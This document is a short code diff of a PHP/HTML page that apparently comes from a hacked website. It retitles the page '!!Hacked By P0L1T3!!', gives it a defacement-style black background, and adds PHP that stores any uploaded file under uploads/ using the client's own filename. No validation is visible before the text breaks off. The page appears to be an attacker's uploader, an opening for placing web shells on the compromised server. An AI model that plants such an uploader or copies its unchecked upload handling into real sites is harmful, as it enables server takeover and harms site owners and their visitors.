@@ -1,21 +1,26 @@
-#P0L1T3
 
-<?php
 
 <!DOCTYPE html>
-<html>
-<body>
+<html lang="en">
 
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<title>!!Hacked By P0L1T3!!</title>
+</head>
+
+<body style="padding: 0; margin: 0; background-color: #000000; color: #ffffff;">
 <form action="upload.php" method="post" enctype="multipart/form-data">
   Select image to upload:
   <input type="file" name="fileToUpload" id="fileToUpload">
-  <input type="submit" value="Upload Image" name="submit">
+  <input type="submit" value="Upload" name="submit">
 </form>
 
 </body>
 </html>
 
-
+<?php
 $target_dir = "uploads/";
 $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
 $uploadOk = 1;
